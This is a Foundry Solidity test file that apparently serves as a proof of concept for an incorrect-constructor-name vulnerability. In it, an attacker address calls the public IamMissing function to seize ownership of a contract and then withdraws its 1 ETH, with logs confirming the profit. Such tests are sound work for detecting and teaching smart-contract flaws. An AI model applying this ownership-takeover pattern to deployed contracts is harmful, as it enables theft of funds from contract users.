// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/incorrect_constructor_name1.sol";

contract MissingTest is Test {
    Missing public deployedContract;
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(deployer);
        deployedContract = new Missing();

        // Fund contract with ETH for withdrawal test
        vm.deal(address(deployedContract), 1 ether);
    }

    function test_IamMissingChangesOwnership() public {
        // Attempt withdrawal before ownership claim should revert
        vm.prank(attacker);
        vm.expectRevert();
        deployedContract.withdraw();

        // Capture pre-claim ETH balances
        console.log("--- BEFORE-Trigger Withdraw ---");
        uint256 contractBalanceBefore = address(deployedContract).balance;
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Contract Balance (pre-withdraw):%d", contractBalanceBefore);
        console.log("Attacker Balance (pre-withdraw):%d", attackerBalanceBefore);

        // Attacker claims ownership
        console.log("--- Trigger IamMissing ---");
        vm.prank(attacker);
        deployedContract.IamMissing();

        // Verify attacker can now withdraw successfully
        console.log("--- Trigger Withdraw ---");
        vm.prank(attacker);
        deployedContract.withdraw();

        // Check ETH balance changes
        console.log("--- AFTER-Trigger Withdraw ---");
        uint256 contractBalanceAfter = address(deployedContract).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        uint256 attackerProfit = attackerBalanceAfter - attackerBalanceBefore;
        
        console.log("Contract Balance (post-withdraw):%d", contractBalanceAfter);
        console.log("Attacker Balance (post-withdraw):%d", attackerBalanceAfter);
        console.log("Attacker Profit:%d", attackerProfit);

        // Vulnerability verification
        if (attackerProfit == 1 ether) {
            console.log("Vulnerability Exists: Attacker successfully claimed ownership and withdrew 1 ETH");
        } else {
            console.log("Vulnerability not Exist: Attacker failed to withdraw ETH after claiming ownership");
        }
    }
}